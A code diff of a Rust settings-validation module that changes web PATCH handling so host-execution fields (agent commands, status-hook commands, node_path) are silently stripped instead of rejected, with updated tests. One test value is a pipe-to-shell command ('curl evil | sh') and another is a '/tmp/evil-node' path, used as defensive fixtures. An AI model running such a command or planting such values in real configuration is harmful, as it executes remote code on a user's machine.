@@ -5,15 +5,16 @@
 //! handlers walk each incoming leaf and ask the schema:
 //!
 //! - is `section.field` a real, known field? (unknown -> 400)
-//! - may the web write it? (`local_only` -> 403 denied)
 //! - does it need passphrase elevation? (`requires_elevation` and not yet
 //!   elevated -> 403)
 //! - is the value well-formed? ([`super::validate_value`] -> 400)
 //!
-//! Rejecting (rather than silently stripping) means a client always learns
-//! whether its value was accepted, and a host-execution surface can never be
-//! written from the web even by accident: the policy is the same data the TUI
-//! and web render from, so the three surfaces cannot drift.
+//! Host-execution surfaces (`local_only`: `node_path`, agent argv/command,
+//! status-hook commands) are stripped from the body by [`strip_local_only`]
+//! before validation, so a bundled or echoed-back patch keeps its safe leaves
+//! and silently drops the local-only ones. They can never reach disk from the
+//! web regardless of how the client framed the request, and the policy is the
+//! same schema data the TUI and web render from, so the surfaces cannot drift.
 //!
 //! Sections absent from the schema (e.g. `hooks`, which runs arbitrary shell
 //! commands on session start and bypasses the repo-hook trust prompt) are
@@ -43,8 +44,6 @@ pub enum PatchRejection {
     UnknownField(String),
     /// Section value was not a JSON object (or `description` not a string). 400.
     Malformed(String),
-    /// Field is a host-execution surface, never web-writable. 403.
-    Denied { path: String, reason: String },
     /// Field needs passphrase elevation the caller has not provided. 403.
     NeedsElevation { path: String, reason: String },
     /// Value failed server-authoritative validation. 400.
@@ -53,10 +52,10 @@ pub enum PatchRejection {
 
 impl PatchRejection {
     /// HTTP status: unknown/malformed/invalid are client errors (400);
-    /// denied/elevation are authorization failures (403).
+    /// elevation is an authorization failure (403).
     pub fn status_code(&self) -> u16 {
         match self {
-            PatchRejection::Denied { .. } | PatchRejection::NeedsElevation { .. } => 403,
+            PatchRejection::NeedsElevation { .. } => 403,
             _ => 400,
         }
     }
@@ -67,7 +66,6 @@ impl PatchRejection {
     pub fn error_code(&self) -> &'static str {
         match self {
             PatchRejection::NeedsElevation { .. } => "elevation_required",
-            PatchRejection::Denied { .. } => "forbidden_field",
             _ => "validation_failed",
         }
     }
@@ -83,9 +81,6 @@ impl PatchRejection {
             }
             PatchRejection::Malformed(s) => {
                 format!("Settings section '{s}' has a malformed value.")
-            }
-            PatchRejection::Denied { path, reason } => {
-                format!("Field '{path}' cannot be set from the web: {reason}")
             }
             PatchRejection::NeedsElevation { .. } => "Re-enter the passphrase to continue".into(),
             PatchRejection::Invalid { path, reason } => {
@@ -107,10 +102,38 @@ fn section_exists(section: &str) -> bool {
     schema().iter().any(|d| d.section == section)
 }
 
+/// Remove every `local_only` leaf from a PATCH body in place, before validation
+/// and merge. A bundled or echoed-back patch that includes a host-execution
+/// surface (`node_path`, agent argv/command, status-hook commands) keeps its
+/// safe leaves and silently drops the local-only ones, so the safe edit still
+/// persists. These fields can never reach disk from the web regardless of how
+/// the client framed the request. Unknown fields are left for `validate_patch`
+/// to reject.
+pub fn strip_local_only(patch: &mut Value) {
+    let Some(obj) = patch.as_object_mut() else {
+        return;
+    };
+    for (section, value) in obj.iter_mut() {
+        let Some(fields) = value.as_object_mut() else {
+            continue;
+        };
+        fields.retain(|field, _| {
+            !matches!(
+                lookup(section, field).map(|d| d.web_write),
+                Some(WebWritePolicy::LocalOnly { .. })
+            )
+        });
+    }
+}
+
 /// Validate every leaf of a settings PATCH body against the schema. Returns the
 /// first rejection encountered, or `Ok(())` if every leaf is a known field the
 /// web may write (given `elevated`) carrying a well-formed value. A `null` leaf
 /// is an override-clear request and skips value validation.
+///
+/// Call [`strip_local_only`] first: this function does not special-case the
+/// `local_only` policy (host-execution surfaces are removed before they get
+/// here), it only gates unknown fields, elevation, and value validity.
 pub fn validate_patch(patch: &Value, scope: Scope, elevated: bool) -> Result<(), PatchRejection> {
     let Some(obj) = patch.as_object() else {
         return Err(PatchRejection::Malformed("<root>".into()));
@@ -134,20 +157,13 @@ pub fn validate_patch(patch: &Value, scope: Scope, elevated: bool) -> Result<(),
             let Some(d) = lookup(section, field) else {
                 return Err(PatchRejection::UnknownField(path));
             };
-            match &d.web_write {
-                WebWritePolicy::LocalOnly { reason } => {
-                    return Err(PatchRejection::Denied {
-                        path,
-                        reason: reason.clone(),
-                    });
-                }
-                WebWritePolicy::RequiresElevation { reason } if !elevated => {
+            if let WebWritePolicy::RequiresElevation { reason } = &d.web_write {
+                if !elevated {
                     return Err(PatchRejection::NeedsElevation {
                         path,
                         reason: reason.clone(),
                     });
                 }
-                _ => {}
             }
             // A null leaf clears a profile override; nothing to validate.
             if val.is_null() {
@@ -200,46 +216,52 @@ mod tests {
     }
 
     #[test]
-    fn agent_command_fields_are_denied_not_stripped() {
+    fn agent_command_fields_are_stripped() {
         // The agent-command tamper surface (binary override, argv, custom
-        // agents, detect-as) is `local_only`: outright 403, stricter than the
-        // old silent-strip. Replaces SESSION_BLOCKED_FIELDS.
+        // agents, detect-as, cockpit cmd) is `local_only`: stripped from the
+        // body before merge so it can never reach disk from the web. Replaces
+        // SESSION_BLOCKED_FIELDS.
         for field in [
             "agent_command_override",
             "agent_extra_args",
             "custom_agents",
             "agent_detect_as",
+            "agent_cockpit_cmd",
         ] {
-            let body = json!({"session": {field: {"claude": "x"}}});
-            let err = validate_patch(&body, Scope::Profile, true).unwrap_err();
+            let mut body = json!({"session": {field: {"claude": "x"}, "yolo_mode_default": true}});
+            strip_local_only(&mut body);
             assert!(
-                matches!(err, PatchRejection::Denied { .. }),
-                "session.{field} must be denied, got {err:?}"
+                body["session"].get(field).is_none(),
+                "session.{field} must be stripped, body: {body}"
             );
-            assert_eq!(err.status_code(), 403);
+            // The safe sibling survives and the stripped body still validates.
+            assert_eq!(body["session"]["yolo_mode_default"], json!(true));
+            assert!(validate_patch(&body, Scope::Profile, true).is_ok());
         }
     }
 
     #[test]
-    fn status_hook_commands_are_denied() {
+    fn status_hook_commands_are_stripped() {
         // Status-hook commands run a local shell on every status change: a
-        // host-execution surface that must never be web-writable, even though
-        // the section's enabled/debounce toggles are.
-        for field in ["on_running", "on_idle", "on_error", "on_change"] {
-            let body = json!({"status_hooks": {field: "curl evil | sh"}});
-            let err = validate_patch(&body, Scope::Profile, true).unwrap_err();
+        // host-execution surface stripped before merge, even though the
+        // section's enabled/debounce toggles persist.
+        let mut body = json!({"status_hooks": {
+            "on_running": "curl evil | sh",
+            "on_idle": "x",
+            "on_change": "y",
+            "enabled": true,
+            "debounce_ms": 250,
+        }});
+        strip_local_only(&mut body);
+        for field in ["on_running", "on_idle", "on_change"] {
             assert!(
-                matches!(err, PatchRejection::Denied { .. }),
-                "status_hooks.{field} must be denied, got {err:?}"
+                body["status_hooks"].get(field).is_none(),
+                "status_hooks.{field} must be stripped, body: {body}"
             );
         }
-        // ...but enabling/timing the hooks is fine.
-        assert!(validate_patch(
-            &json!({"status_hooks": {"enabled": true, "debounce_ms": 250}}),
-            Scope::Profile,
-            true
-        )
-        .is_ok());
+        assert_eq!(body["status_hooks"]["enabled"], json!(true));
+        assert_eq!(body["status_hooks"]["debounce_ms"], json!(250));
+        assert!(validate_patch(&body, Scope::Profile, true).is_ok());
     }
 
     #[test]
@@ -314,20 +336,16 @@ mod tests {
     }
 
     #[test]
-    fn cockpit_is_now_web_writable() {
+    fn cockpit_is_now_web_writable_except_node_path() {
         // The single-source fix: cockpit settings are reachable from the web
-        // (the old curated allowlist rejected the whole section), except the
-        // local_only node_path.
-        assert!(
-            validate_patch(&json!({"cockpit": {"enabled": true}}), Scope::Profile, true).is_ok()
-        );
-        let err = validate_patch(
-            &json!({"cockpit": {"node_path": "/tmp/node"}}),
-            Scope::Profile,
-            true,
-        )
-        .unwrap_err();
-        assert!(matches!(err, PatchRejection::Denied { .. }));
+        // (the old curated allowlist rejected the whole section). A bundled
+        // patch keeps the safe knob and silently drops the local_only
+        // node_path (matches the COCKPIT_BLOCKED_FIELDS strip contract).
+        let mut body = json!({"cockpit": {"enabled": true, "node_path": "/tmp/evil-node"}});
+        strip_local_only(&mut body);
+        assert!(body["cockpit"].get("node_path").is_none());
+        assert_eq!(body["cockpit"]["enabled"], json!(true));
+        assert!(validate_patch(&body, Scope::Profile, true).is_ok());
     }
 
     #[test]
